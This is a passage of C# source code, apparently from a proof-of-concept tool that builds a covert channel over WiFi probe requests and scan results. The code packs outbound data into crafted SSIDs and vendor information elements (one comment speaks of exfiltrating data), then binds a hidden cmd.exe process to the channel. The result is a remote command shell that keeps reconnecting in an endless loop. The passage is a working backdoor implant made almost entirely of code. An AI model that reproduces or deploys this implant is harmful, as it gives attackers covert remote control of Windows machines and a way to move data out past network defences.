                            //A REQUEST-REPLY-SCHEME, THE SERVER WOULDN'T BE ABLE TO SEND OTHERWISE

                            next_outbytes = empty;
                            if (this.out_queue.Count > 0) next_outbytes = this.out_queue.pop();
                            payloads = Helper.split(next_outbytes, Packet2.PAY1_MAX_LEN);
                            req.pay1 = payloads[0];
                            req.pay2 = payloads[1];

                        }

                        //DELETE !!!
                        /*
                        String indata = System.Text.Encoding.ASCII.GetString(resp.pay1);
                        if (resp.pay2 != null) indata += System.Text.Encoding.ASCII.GetString(resp.pay2);
                        Console.WriteLine(String.Format("Indata ASCII: {0}", indata));
                        */
                    }
                }

                Console.WriteLine("=========== SCAN END ====================");
            }

            Console.WriteLine("Stopping send/receive thread for ClientSocket, because socket isn't not in OPEN state.");
        }

        public bool hasInData()
        {
            if (this.in_queue.Count > 0) return true;
            return false;
        }

        public int Receive(byte[] buffer, bool blocking=true)
        {
            //the buffer has to have a minimum size of MTU
            //socket has to be in connect state

            if (!Connected) return -1;
            if (buffer == null) return -2;
            //ToDo: Remove after testing
            //if (buffer.Length < this.MTU) return -3;

            if (blocking)
            {
                while (this.state == SocketState.STATE_OPEN && !this.in_queue.waitForData(200)); //Block till data arrived, but interrupt every 200 ms to deal with closed socket
            }

            if (this.in_queue.Count == 0) return 0;

            int len_received = 0;
            int len_chunk = 0;
            byte[] current_chunk;

            while (len_received < buffer.Length)
            {
                if (this.in_queue.Count == 0) break;
                len_chunk = this.in_queue.Peek().Length;

                //if the chunk doesn't fit into the buffer, we return what we have so far
                if ((len_received + len_chunk) > buffer.Length) break;

                //pop next chunk
                current_chunk = this.in_queue.pop();


                //if this is a chunk of length == 0 it indicates an "EOF" and we abort further receiving
                //ToDO: introduce a CTLM_TYPE_EOF to replace fiddeling with empty payloads (as we ant to handle CTLM_TYPE payloads with priority
                // it has to be considered that a CTLM_TYPE_EOF has to be placed on in_queue with respect to arrival order, once implemented)
                if (len_chunk == 0) break; //note: we have popped the zero length chunk before breaking the loop

                Buffer.BlockCopy(current_chunk, 0, buffer, len_received, len_chunk);
                len_received += len_chunk;
            }

            return len_received;
        }

        public int Send(byte[] buffer, int size, bool aggregate=false)
        {
            //Note: empty buffer is never pushed to outdata

            if (buffer == null) return 0;
            if (buffer.Length < size) return 0;
            int outcount = 0;

            byte[] lastSend = new byte[this.MTU];
            for (int off=0; off < size; off+=this.MTU)
            {
                int len = Math.Min(this.MTU, size - off);
                byte[] chunk = Helper.subArray(buffer, off, len);
                pushOutboundData(chunk, aggregate);
                outcount += len;
            }
            
            return outcount;
        }

        private void pushOutboundData(byte[] data, bool aggregate=false)
        {
            this.out_queue.push(data);
            
            if(aggregate)
            {
                //ToDo: outqueue has to be locked during whole operation
                byte[][] copy = this.out_queue.ToArray();
                List<byte> aggregation = new List<byte>();
                this.out_queue.Clear();

                //Aggregate
                foreach (byte[] bytes in copy) aggregation.AddRange(bytes);

                //pop chunks from aggregation and push them back to queque via send
                byte[] all = aggregation.ToArray();
                this.Send(all, all.Length, false);

            }

#if DEBUG
           // Console.WriteLine(String.Format("Out queue elements: {0}", this.out_queue.Count));
#endif

        }

        
        private byte[] popInboundData()
        {
            if (this.in_queue.Count > 0) return this.in_queue.Dequeue();
            return null;
        }

        //ToDo: Implement with CTLM_TYPE == RESET
        void Disconnect()
        {

        }
    }

    public static class NativeWifi
    {
        
        private const UInt32 CL_VER_GT_XP = 2; //Version greater XP SP2 (Support for pleData + SSID on scan)
        private static AutoResetEvent waitScanComplete = new AutoResetEvent(false);

        //WLAN_INTERFACE_STATE enum
        public enum WlanInterfaceState
        {
            NotReady = 0,
            Connected = 1,
            AdHocNetworkFormed = 2,
            Disconnecting = 3,
            Disconnected = 4,
            Associating = 5,
            Discovering = 6,
            Authenticating = 7
        }

        public enum Dot11BssType
        {
            Infrastructure = 1,
            Independent = 2,
            Any = 3
        }

        public enum Dot11PhyType : uint
        {
            Unknown = 0,
            Any = Unknown,
            FHSS = 1,
            DSSS = 2,
            IrBaseband = 3,
            OFDM = 4,
            HRDSSS = 5,
            ERP = 6,
            IHV_Start = 0x80000000,
            IHV_End = 0xffffffff
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RAW_IE_DATA
        {
            /// DWORD->unsigned int
            public uint dwDataSize;

            /// UCHAR[]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 240)] //max length for data pointed to by pIeData
            public byte[] dataBlob;
        }


        //first part of _WLAN_INTERFACE_INFO_LIST
        [StructLayout(LayoutKind.Sequential)]
        internal struct WlanInterfaceInfoListHeader
        {
            public uint numberOfItems;
            public uint index;
            //Continues with WLAN_INTERFACE_INFO[] (numberOfItems elements) 
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct WlanBssListHeader
        {
            internal uint totalSize;
            internal uint numberOfItems;
        }

        //WLAN_INTERFACE_INFO struct
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WlanInterfaceInfo
        {
            public Guid interfaceGuid;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string interfaceDescription;
            public WlanInterfaceState isState;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct WlanRateSet
        {
            private uint rateSetLength;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 126)]
            private ushort[] rateSet;
            public ushort[] Rates
            {
                get
                {
                    ushort[] rates = new ushort[rateSetLength / sizeof(ushort)];
                    Array.Copy(rateSet, rates, rates.Length);
                    return rates;
                }
            }
            public double GetRateInMbps(int rateIndex)
            {
                if ((rateIndex < 0) || (rateIndex > rateSet.Length)) throw new ArgumentOutOfRangeException("rateIndex");
                return (rateSet[rateIndex] & 0x7FFF) * 0.5;
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct WlanBssEntry
        {
            public DOT11_SSID dot11Ssid;
            public uint phyId;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public byte[] dot11Bssid;
            public Dot11BssType dot11BssType;
            public Dot11PhyType dot11BssPhyType;
            public int rssi;
            public uint linkQuality;
            public bool inRegDomain;
            public ushort beaconPeriod;
            public ulong timestamp;
            public ulong hostTimestamp;
            public ushort capabilityInformation;
            public uint chCenterFrequency;
            public WlanRateSet wlanRateSet;
            public IntPtr ieOffset;
            public uint ieSize;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct DOT11_SSID
        {
            /// ULONG->unsigned int
            public uint uSSIDLength;

            /// UCHAR[]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public byte[] ucSSID;
        }


        [DllImport("Wlanapi", EntryPoint = "WlanEnumInterfaces")]
        public static extern uint WlanEnumInterfaces([In] IntPtr hClientHandle, IntPtr pReserved, out IntPtr ppInterfaceList);

        [DllImport("wlanapi.dll")]
        public static extern int WlanOpenHandle(
            [In] UInt32 clientVersion,
            [In, Out] IntPtr pReserved,
            [Out] out uint negotiatedVersion,
            [Out] out IntPtr clientHandle);

        [DllImport("Wlanapi", EntryPoint = "WlanCloseHandle")]
        public static extern uint WlanCloseHandle([In] IntPtr hClientHandle, IntPtr pReserved);

        [DllImport("Wlanapi.dll", SetLastError = true)]
        public static extern uint WlanScan(
            IntPtr hClientHandle, 
            ref Guid pInterfaceGuid, 
            IntPtr pDot11Ssid, //not for XP SP2 or earlier
            IntPtr pIeData, //not for XP SP2 or earlier + not neccesarily supported by driver
            IntPtr pReserved);

        [DllImport("wlanapi.dll")]
        public static extern int WlanGetNetworkBssList(
            [In] IntPtr clientHandle,
            ref Guid pInterfaceGuid,
            [In] IntPtr dot11SsidInt,
            [In] Dot11BssType dot11BssType,
            [In] bool securityEnabled,
            IntPtr reservedPtr,
            [Out] out IntPtr wlanBssList
        );


        /*
         * Interop part for handling notification callbacks (e.g. WlanScan has finished)
         */

        [Flags]
        public enum WlanNotificationSource
        {
            None = 0,
            All = 0X0000FFFF,
            ACM = 0X00000008,
            MSM = 0X00000010,
            Security = 0X00000020,
            IHV = 0X00000040
        }

        public enum WlanNotificationCodeAcm
        {
            AutoconfEnabled = 1,
            AutoconfDisabled,
            BackgroundScanEnabled,
            BackgroundScanDisabled,
            BssTypeChange,
            PowerSettingChange,
            ScanComplete,
            ScanFail,
            ConnectionStart,
            ConnectionComplete,
            ConnectionAttemptFail,
            FilterListChange,
            InterfaceArrival,
            InterfaceRemoval,
            ProfileChange,
            ProfileNameChange,
            ProfilesExhausted,
            NetworkNotAvailable,
            NetworkAvailable,
            Disconnecting,
            Disconnected,
            AdhocNetworkStateChange
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct WlanNotificationData
        {
            public WlanNotificationSource notificationSource;
            public int notificationCode;
            public Guid interfaceGuid;
            public int dataSize;
            public IntPtr dataPtr;
        }


        public delegate void WlanNotificationCallbackDelegate(ref WlanNotificationData notificationData, IntPtr context);

        [DllImport("wlanapi.dll")]
        public static extern int WlanRegisterNotification(
            [In] IntPtr clientHandle,
            [In] WlanNotificationSource notifSource,
            [In] bool ignoreDuplicate,
            [In] WlanNotificationCallbackDelegate funcCallback,
            [In] IntPtr callbackContext,
            [In] IntPtr reserved,
            [Out] out WlanNotificationSource prevNotifSource);


        /*
         * Methods
         */
        public static byte[] simpleChecksum16(byte[] input, int len = -1)
        {
            UInt16 sum = 0;
            int off=0;

            if (len == -1) len = input.Length; //Calculate for full array


            for (off = 0; off < len; off++)
            {
                sum += input[off];
                sum %= 0xFFFF;
            }

            sum = (UInt16) ~sum; 

            byte[] res = new byte[2];
            res[0] = (byte) ((sum & 0xFF00) >>8);
            res[1] = (byte) (sum & 0x00FF);
            return res;
        }

        
        public static IntPtr openNativeWifiHandle(uint desiredVersion=CL_VER_GT_XP)
        {
            IntPtr handle = IntPtr.Zero;
            uint negotiatedVersion;
            WlanOpenHandle(desiredVersion, IntPtr.Zero, out negotiatedVersion, out handle);

            if (desiredVersion != negotiatedVersion) return IntPtr.Zero; //Not what we wanted
            return handle;
        }

        public static void closeNativeWifiHandle(IntPtr handle)
        {
            WlanCloseHandle(handle, IntPtr.Zero);
        }

        public static Packet2[] SendRecv(IntPtr clientHandle, Guid interface_guid, Packet2 outpacket, bool block = true)
        {
            bool useCustomIe = true; //adds a vendor define IE to exfiltrate 238 additional bytes of data
            List<Packet2> result = new List<Packet2>();

            //useCustomIe = outpacket.FlagIncludedVenIe;
            useCustomIe = outpacket.pay2 != null;


            /*
             * Sending part
             * According to https://msdn.microsoft.com/en-us/library/windows/desktop/ms706783(v=vs.85).aspx
             * "...The driver may or may not send probe requests (an active scan) depending on its implementation and the values passed in the pDot11Ssid and pIeData parameters..."
             * 
             * This means the upstream channel is only working if the driver is willing.
             * An alternative would be to use the Connect function, instead of scan, to force probing for a custom SSID.
             * BUT THIS WOULD INTERRUPT CURRENT WIFI CONNECTIONS!
             * 
             * pleData is currently unused, but could add additional 240 bytes to the custom probe (DOT11_PSD_IE_MAX_DATA_SIZE = 240).
             * using only the SSID ie we're stuck at 32 bytes per transmitted probe request, but more compatibility is achieved.
             * 
             * Remember: This is only a PoC !!!
             * 
             */

            //Generate SSID out of sendbuf
            DOT11_SSID ssid = new DOT11_SSID();
            ssid.uSSIDLength = 32;
            //ssid.ucSSID = outpacket.ssid_raw_data;
            ssid.ucSSID = outpacket.generateRawSsid();

            //Convert to C-Struct + ptr
            IntPtr pSsid = Marshal.AllocHGlobal(Marshal.SizeOf(ssid));
            Marshal.StructureToPtr(ssid, pSsid, true);


            if (useCustomIe)
            {


                //ToDo: Everything handed in to pIeData gets send unmodified (a valid TLV IE has to be build by hand)
                RAW_IE_DATA ieData = new RAW_IE_DATA();
                ieData.dataBlob = outpacket.generateRawVenIe(true);
                ieData.dwDataSize = (uint) ieData.dataBlob.Length; 
                
                //Convert to c struct and retrieve pointer
                IntPtr pIeData = Marshal.AllocHGlobal(Marshal.SizeOf(ieData));
                Marshal.StructureToPtr(ieData, pIeData, true);

                WlanScan(clientHandle, ref interface_guid, pSsid, pIeData, IntPtr.Zero);
            }
            else
            {
                WlanScan(clientHandle, ref interface_guid, pSsid, IntPtr.Zero, IntPtr.Zero);
            }
            Marshal.FreeHGlobal(pSsid);

            /*
             * Receiving part
             */

            if (block) waitScanComplete.WaitOne();

            //Retrieve BSS List (update from scan at some time)
            IntPtr scan_res = new IntPtr();
            WlanGetNetworkBssList(clientHandle, ref interface_guid, IntPtr.Zero, Dot11BssType.Any, false, IntPtr.Zero, out scan_res);

            
            //Convert result to WlanBSSListHeader struct + multiple WlanBSSEntry structs
            WlanBssListHeader bssListHeader = (WlanBssListHeader)Marshal.PtrToStructure(scan_res, typeof(WlanBssListHeader));
            long bssListPtr = scan_res.ToInt64() + Marshal.SizeOf(typeof(WlanBssListHeader));
            WlanBssEntry[] bssEntries = new WlanBssEntry[bssListHeader.numberOfItems];
            //            int validSizeCount = 0;

            if (bssListHeader.numberOfItems == 0) return null;

            for (int i = 0; i < bssListHeader.numberOfItems; ++i)
            {
                byte[] in_ssid = null;
                byte[] in_sa = null;
                byte[] in_ie_vendor = null;
                uint in_ssid_len = 0;

                bssEntries[i] = (WlanBssEntry)Marshal.PtrToStructure(new IntPtr(bssListPtr), typeof(WlanBssEntry)); //Convert data at current bssListPtr to WlanBssEntry struct
                //calculate pointer to IeData for current BSS_ENTRY
                IntPtr pIeData = new IntPtr(bssListPtr + bssEntries[i].ieOffset.ToInt64());

                //Read and store probed SSID
                in_ssid_len = bssEntries[i].dot11Ssid.uSSIDLength;
                in_ssid = bssEntries[i].dot11Ssid.ucSSID;

                //Read, convert and store probing BSSID
                in_sa = bssEntries[i].dot11Bssid;


                //extract vendor IE (type = 221) if present
                in_ie_vendor = extractIe(221, pIeData, bssEntries[i].ieSize);

                Console.WriteLine(String.Format("SSID recieved: {0}", Helper.bytes2hexStr(in_ssid)));
                if (!Packet2.checkLengthChecksum(in_ssid, in_ie_vendor))
                {
                    //Console.WriteLine(String.Format("Packet dropped in filter, BSSID {0} SSID {1}", ethaddr2str(in_sa), System.Text.Encoding.ASCII.GetString(in_ssid)));
                    bssListPtr += Marshal.SizeOf(typeof(WlanBssEntry)); //advance bssListPtr by sizeof(WlanBssEntry) struct
                    Console.WriteLine(String.Format("Discarded SSID: {0}", Helper.bytes2hexStr(in_ssid)));
                    continue; //skip invalid packets
                }

                
                Packet2 packet = Packet2.parse2packet(in_sa, new byte[6], in_ssid, in_ie_vendor);
                result.Add(packet);
                
                bssListPtr += Marshal.SizeOf(typeof(WlanBssEntry)); //advance bssListPtr by sizeof(WlanBssEntry) struct
            }

            return result.ToArray();
        }

        public static byte[] extractIe(byte searched_ie_type, IntPtr pIeData, uint lenIeData)
        {
            byte[] result = null;
            int pos = 0;
            byte ie_len = 0;
            byte ie_type = 0;
            

            if (lenIeData < 2) return result; //no valid IEs present

            while (pos < (lenIeData - 2))
            {
                //read type + length of current ie
                try
                {
                    ie_type = Marshal.ReadByte(pIeData, pos);
                    pos++;
                    ie_len = Marshal.ReadByte(pIeData, pos);
                    pos++;
                }
                catch (System.AccessViolationException)
                {
                    Console.WriteLine(String.Format("Access violation in extractIe for IE type {0}", searched_ie_type));
                    return result;
                }

                //check if searched type
                if (ie_type == searched_ie_type)
                {
                    result = new byte[ie_len];
                    Marshal.Copy(new IntPtr(pIeData.ToInt64() + pos), result, 0, ie_len);

                    //We're done with the loop if we have a hit
                    break;
                }
                pos += ie_len; //advance ptr to next IE
            }
            return result;
        }

        public static WlanInterfaceInfo[] enumInterfaces(IntPtr nativeWifiHandle)
        {
            IntPtr pIfaceList;
            WlanEnumInterfaces(nativeWifiHandle, IntPtr.Zero, out pIfaceList);

            //Recreate WLAN_INTERFACE_INFO[] structures
            WlanInterfaceInfoListHeader iflh = (WlanInterfaceInfoListHeader)Marshal.PtrToStructure(pIfaceList, typeof(WlanInterfaceInfoListHeader)); //convert struct pointed to to InterfaceInfoListHeader (only first two elements)
            WlanInterfaceInfo[] ifi = new WlanInterfaceInfo[iflh.numberOfItems];
            Int64 ptrVal = pIfaceList.ToInt64() + Marshal.SizeOf(iflh); //Offset pointer value beyond two header fields (First WLAN_INTERFACE_INFO entry)
            for (int i = 0; i < iflh.numberOfItems; i++)
            {
                ifi[i] = (WlanInterfaceInfo)Marshal.PtrToStructure(new IntPtr(ptrVal), typeof(WlanInterfaceInfo));
                ptrVal += Marshal.SizeOf(ifi[i]);
            }

            return ifi;
        }


        static void OnACMNotification(ref WlanNotificationData notifyData, IntPtr context)
        {
            
            switch ((WlanNotificationCodeAcm)notifyData.notificationCode)
            {
#if DEBUG
                case WlanNotificationCodeAcm.ConnectionStart:
                case WlanNotificationCodeAcm.ConnectionComplete:
                case WlanNotificationCodeAcm.ConnectionAttemptFail:
                case WlanNotificationCodeAcm.Disconnecting:
                case WlanNotificationCodeAcm.Disconnected:
                    break;
#endif
                case WlanNotificationCodeAcm.ScanFail:
#if DEBUG
                    Console.WriteLine("Scan failed!");
#endif
                    waitScanComplete.Set();
                    break;
                case WlanNotificationCodeAcm.ScanComplete:
#if DEBUG
                    Console.WriteLine("Scan completed!");
#endif
                    waitScanComplete.Set();
                    break;
#if DEBUG
                case WlanNotificationCodeAcm.NetworkAvailable:
                    Console.WriteLine("Network Available!");
                    break;
                case WlanNotificationCodeAcm.NetworkNotAvailable:
                    Console.WriteLine("Network NOT Available!");
                    break;
                case WlanNotificationCodeAcm.ProfilesExhausted:
                    Console.WriteLine("Profiles exhausted!");
                    break;
#endif
            }

        }

        public class ClientSubProc
        {
            String command;
            ClientSocket csock;
            ProcessStartInfo psi;
            Process proc;

            byte[] sock_in_buf;

            public ClientSubProc(ClientSocket socket, String command)
            {
                this.csock = socket;
                this.command = command;

                int in_buf_size = Packet2.PAY1_MAX_LEN;
                if (csock.rxVenIeWorking) in_buf_size += Packet2.PAY2_MAX_LEN; //larger inbuffer if we are able to receive ven IE
                sock_in_buf = new byte[in_buf_size];
                
            }

            private void out_handler(object proc, DataReceivedEventArgs data_args)
            {
                String outstr = data_args.Data + "\n"; //data receives line-wise, we add back in a linefeed, as it everything gets accumulated to MTU size before sending
                byte[] outbytes = System.Text.Encoding.UTF8.GetBytes(outstr); 
                Console.WriteLine(String.Format("Proc data to socket: {0}", outstr));
                csock.Send(outbytes, outbytes.Length, true);
            }

            public int attachSubProcToSocket()
            {
                int socket_disconnect_reason = 0;

                this.psi = new ProcessStartInfo(command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                    
                };
                this.proc = new Process { StartInfo = this.psi };
                proc.OutputDataReceived += new DataReceivedEventHandler(this.out_handler);
                proc.ErrorDataReceived += new DataReceivedEventHandler(this.out_handler);

                this.proc.Start();
                this.proc.BeginErrorReadLine();
                this.proc.BeginOutputReadLine();

                //folowing loop needs to be moved to dedicated thread
                int rcv_len;
                while (csock.state == SocketState.STATE_OPEN)
                {
                    String instr = "";
                    //if socket has input, read it and write to proc stdin
                    //while (csock.hasInData())
                    {
                        rcv_len = csock.Receive(sock_in_buf);
                        if (rcv_len > 0)
                            instr += System.Text.Encoding.UTF8.GetString(sock_in_buf, 0, rcv_len);
                    }
                    if (instr.Length > 0)
                    {
                        Console.WriteLine(String.Format("Socketdata data to proc: {0}", instr));
                        this.proc.StandardInput.Write(instr);
                        this.proc.StandardInput.Flush();
                    }
                }
                
                if (csock.state == SocketState.CLOSE)
                {
                    //socket disconnected, extract reason
                    socket_disconnect_reason = csock.socket_close_reason;
                    Console.WriteLine(String.Format("Socket backing the process disconnected with reason: {0}", socket_disconnect_reason));
                }
                Console.WriteLine(String.Format("Socket closed ... ending listening process '{0}'", this.command));
                this.proc.Close();
                this.proc.Dispose();

                return socket_disconnect_reason;
            }
            
        }

        public static int connectAndBindProc(int connection_attempts=3, byte server_id=9)
        {
            /*
             * Return codes
             * -1: no WiFi API handle
             * -2: Couldn't register for "scan completed" notification
             * -3: None of the interface allowed a connection to the server (after 3 attempts)
             * -4: Connection reset for unknown reason (happens when the server kills the socket --> retry connect)
             * -5: Server requested kill client
             */

            IntPtr handle = openNativeWifiHandle();
            if (handle == IntPtr.Zero)
            {
                Console.WriteLine("No valid handle for native WiFi API received");
                return -1;
            }

            try
            {
                WlanNotificationSource prevSrc;
                WlanRegisterNotification(handle, WlanNotificationSource.ACM, false, OnACMNotification, IntPtr.Zero, IntPtr.Zero, out prevSrc);
            }
            catch
            {
                Console.WriteLine("Error registering for Notifications");
                closeNativeWifiHandle(handle);
                return -2;
            }


            //Enumerate interfaces
            WlanInterfaceInfo[] ifis = enumInterfaces(handle);

            int connection_exit_code = -3;

            //Try every available interface
            foreach (WlanInterfaceInfo ifi in ifis)
            //WlanInterfaceInfo ifi = ifis[1];
            {
                //ToDo: Ignore stale interfaces

                //use first available interface
                Guid g_if = ifi.interfaceGuid;
                Console.WriteLine(String.Format("Trying to connect covert channel via '{0}'", ifi.interfaceDescription));

                ClientSocket wsock = new ClientSocket();
                
                bool conres = wsock.Connect(handle, g_if, server_id, connection_attempts);

                if (conres)
                {
                    Console.WriteLine(String.Format("Connection established\nMTU: {0}\nClientID: {1}", wsock.MTU, wsock.clientID));
                    ClientSubProc cp = new ClientSubProc(wsock, "cmd.exe");
                    int result = cp.attachSubProcToSocket();
                    if (result == 1) connection_exit_code = -4;
                    else if (result == 2)
                    {
                        connection_exit_code = -5; //kill client
                        break;
                    }
                    Console.WriteLine(String.Format("Subprocess died with reason code: {0}", result));
                }
                else
                {
                    Console.WriteLine(String.Format("No success after {0} connection attempts", connection_attempts));
                }



            }

            Console.WriteLine("Closing handle to native WiFi API");
            closeNativeWifiHandle(handle);

            return connection_exit_code;
        }

        
/*
#if DEBUG
        [DllImport("kernel32")]
        static extern bool AllocConsole();
#endif
*/
        public static void run(int con_attempts=-1, byte srvID=9)
        {
#if DEBUG
//            AllocConsole();

            Console.WriteLine("Starting test");
#endif
            bool retry = true;
            while (retry)
            {
                int ex_code = connectAndBindProc(con_attempts, srvID); //listen on server ID 9, endless connection attempts
                Console.WriteLine(String.Format("Process died with exit code: {0}", ex_code));
                if (ex_code == -5) break;
            }


            //Avoid exitting lib
            //Console.Read();
        }

    }
}
